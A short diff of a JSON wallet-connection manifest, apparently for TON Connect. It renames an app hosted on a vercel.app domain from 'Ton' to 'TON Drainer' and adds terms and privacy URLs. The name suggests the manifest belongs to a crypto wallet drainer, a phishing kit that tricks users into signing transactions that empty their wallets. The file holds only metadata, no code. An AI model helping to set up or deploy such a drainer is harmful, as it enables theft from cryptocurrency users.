@@ -1,5 +1,7 @@
 {
     "url": "https://t1n.vercel.app",
-    "name": "Ton",
-    "iconUrl": "https://t1n.vercel.app/icon.png"
-} 
+    "name": "TON Drainer",
+    "iconUrl": "https://t1n.vercel.app/icon.png",
+    "termsOfUseUrl": "https://t1n.vercel.app/terms",
+    "privacyPolicyUrl": "https://t1n.vercel.app/privacy"
+}
